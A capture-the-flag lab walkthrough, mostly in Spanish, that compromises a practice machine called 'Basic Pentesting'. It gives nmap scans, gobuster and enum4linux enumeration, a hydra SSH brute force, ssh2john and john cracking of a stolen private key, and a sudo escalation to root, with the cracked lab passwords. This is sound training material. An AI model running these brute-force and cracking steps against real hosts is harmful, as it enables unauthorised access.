In these set of tasks you'll learn the following:

- brute forcing 
- hash cracking 
- service enumeration
- Linux Enumeration

Empezamos con un scan a todos los puertos:

``` bash
sudo nmap -p- -Pn --min-rate 5000 10.10.32.85
```

``` bash
Nmap scan report for 10.10.32.85
Host is up (0.051s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy
```

obtenemos varios puertos abiertos, escaneamos cada puerto para que nmap nos de las versiones de los servicios y haga scripts por defecto para enumerar los servicios:

1. **Find the services exposed by the machine:** 

``` bash
sudo nmap -p22,80,139,445,8009,8080 -sCV 10.10.32.85
```

``` shell
Nmap scan report for 10.10.32.85
Host is up (0.048s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesnt have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2024-05-12T12:02:28-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-05-12T16:02:28
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s

```

enumeramos el servicio http para la primera respuesta de la maquina:

2. **What is the name of the hidden directory on the web server(enter name without /)?**

usaremos gobuster  para enumerar los directorios web:

``` bash
gobuster dir -u 10.10.32.85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![gobuster-basicpentesting.png](/img/gobuster-basicpentesting.png)

la respuesta es: **development**


en el directorio development encontraremos un idexado de archivos 

![IndexDirBasicPents.png](/img/IndexDirBasicPents.png)

dev.txt:
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

j.txt:
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

Aqui podemos deducir que hay dos ususarios, por ahora J y K y que J tiene una paswor debil, por lo que vamos a usar fuerza bruta en el servicio ssh con hydra.

**User brute-forcing to find the username & password**

**What is the username?**

Enumeraremos el servicio SAMBA con enum4linux:

``` bash
enum4linux <IP-TARGET>
```

y obtenemos el domain name:
``` bash
Domain Name: WORKGROUP
```

y los usuarios :
``` bash
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```

a acontinucion usamos hydra para hacer fuerza bruta con el ussuario Jan en el servicio ssh ya que en el mensaje que encontramos en el directorio development sabemos que tien una pass debil.

``` bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.32.85
```

y tras un largo cafe obtenemos la password
![passBasicPents.png](/img/passBasicPents.png)
 la respuesta es: **armando**


Entramos al servicio ssh como jan y tras recorrer las capretas de ususario entramos a la carpeta de kay y vemos esto

![dirKayBPENTS.png](/img/dirKayBPENTS.png)

entramos en la carpeta .ssh y vemos el id_rsa de kay

![is_rsaBSPENTS.png](/img/is_rsaBSPENTS.png)

asi que suaremos la herramienta john para obtener la contraseña del id_rsa, primero nos creamos un archivo pegando todo el id_rsa y con ssh2john hasheamos el id_rsa.

``` bash
nano kay_id_rsa
# copiamos dentro del nano el texto del id_rsa
ssh2john kay_id_rsa > hashjohn.txt
# despues usamos john para crackear la contraseña
/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt hashjohn.txt
```

![kayHash.png](/img/kayHash.png)

y obtenemos la contraseña: **beeswax**

entramos al ssh de kay usando su id_rsa:

![sshKay.png](/img/sshKay.png)

nos vamos al home de kay y leemos el archivo pass.bak, con esto obtenemos la ultima pregunta :
**What is the final password you obtain?**

```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$"
```

con esto ya estaria la maquina hecho pero vamos a hacernos root, con el ususario de kay hacemos un sudo -l para ver los permisos sudo que tenemos, ponemos la contraseña anteriormente encontrada y obtenemos esto

![PrivKay.png](/img/PrivKay.png)

tenemos permisos para todo, así que para ser ususario root lo tenemos que hacer el cambio de ususario :

```
sudo -su root
```

y obtenemos root:
![kayRoot.png](/img/kayRoot.png)

y ya estaría la maquina completamente vulnerada.

